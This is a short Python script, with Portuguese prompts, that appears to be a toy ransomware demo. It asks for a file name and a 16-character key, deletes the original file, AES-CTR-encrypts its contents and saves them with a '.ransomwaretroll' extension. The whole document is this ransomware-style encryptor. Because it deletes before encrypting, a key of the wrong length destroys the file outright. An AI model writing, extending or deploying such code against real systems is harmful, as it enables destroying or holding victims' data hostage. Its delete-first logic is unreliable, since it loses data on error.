import os
import pyaes

def criptografar_arquivo(file_name, key):
    if not os.path.exists(file_name):
        print(f"Erro: Arquivo '{file_name}' não encontrado.")
        return

    try:
        with open(file_name, "rb") as file:
            file_data = file.read()

        os.remove(file_name)

        aes = pyaes.AESModeOfOperationCTR(key.encode())
        crypto_data = aes.encrypt(file_data)

        new_file = file_name + ".ransomwaretroll"
        with open(new_file, 'wb') as file:
            file.write(crypto_data)

        print(f"Arquivo '{file_name}' criptografado com sucesso.")
    except Exception as e:
        print(f"Erro ao criptografar o arquivo: {e}")

if __name__ == "__main__":
    file_name = input("Digite o nome do arquivo para criptografar: ")
    key = input("Digite a chave de 16 caracteres: ")
    criptografar_arquivo(file_name, key)

